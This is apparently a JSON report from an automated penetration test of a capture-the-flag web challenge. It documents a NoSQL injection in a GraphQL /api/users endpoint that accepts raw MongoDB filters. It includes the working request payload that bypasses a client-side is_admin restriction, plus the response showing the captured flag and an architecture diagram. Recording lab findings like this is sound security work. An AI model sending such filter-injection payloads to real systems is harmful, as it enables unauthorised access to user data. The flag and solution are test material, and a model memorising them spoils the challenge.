@@ -1,0 +1,27 @@
+{
+  "meta": {
+    "created": "2026-04-13T11:48:55.884116+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "3ecff3aa-c4f7-4ae4-ac7a-2755f9b458bf",
+      "timestamp": "2026-04-13T11:48:55.884029+00:00",
+      "title": "BOLA/NoSQL Injection \u2014 Admin flag extracted via cross-domain user enumeration",
+      "severity": "critical",
+      "target": "http://172.17.0.1:42595/api/users",
+      "description": "The GraphQL endpoint /api/users accepts a raw MongoDB filter string in the 'search' parameter. The front-end JavaScript hardcodes a filter restricting results to is_admin=false and the @heytheregotrythis.com domain. By sending a modified filter {\"is_admin\": true} directly to the API (bypassing client-side restrictions), an attacker can enumerate all admin users across all domains. A second admin user (admin2@goodyoutriedsomethingelse.com) belonging to a different domain holds the CTF flag in a 'flag' field that is never exposed to the front-end.",
+      "evidence": "POST /api/users HTTP/1.1\nContent-Type: application/json\n\n{\"query\": \"query { users(search: \\\"{\\\\\\\"is_admin\\\\\\\": true}\\\", options: \\\"{\\\\\\\"skip\\\\\\\": 0, \\\\\\\"limit\\\\\\\": 100}\\\") { username email flag } }\"}\n\nResponse:\n{\n  \"users\": [\n    {\"email\": \"admin@heytheregotrythis.com\", \"flag\": null, \"username\": \"admin\"},\n    {\"email\": \"admin2@goodyoutriedsomethingelse.com\", \"flag\": \"FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}\", \"username\": \"admin2\"}\n  ]\n}\n\nCTF FLAG: FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}",
+      "tool_used": "http_request",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "c629152e-78d2-49d8-b1c8-02a0264729b8",
+      "timestamp": "2026-04-13T11:49:19.187652+00:00",
+      "title": "Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser (jQuery SPA)\"] -->|\"POST /api/users GraphQL\"| API[\"Flask API /api/users\"]\n  API -->|\"MongoDB filter query\"| DB[\"MongoDB (users collection)\"]\n  DB -->|\"admin@heytheregotrythis.com flag=null\"| API\n  DB -->|\"admin2@goodyoutriedsomethingelse.com flag=FLAG{...}\"| API\n  API --> Browser\n  Browser -->|\"GET /static/js/scripts.js\"| Static[\"Static Files\"]\n  Static -->|\"Hardcoded filter: is_admin=false + domain regex\"| Browser\n  note1[\"VULNERABILITY: API accepts raw MongoDB filters\\nBypassing is_admin=false reveals cross-domain admin with flag\"]"
+    }
+  ]
+}
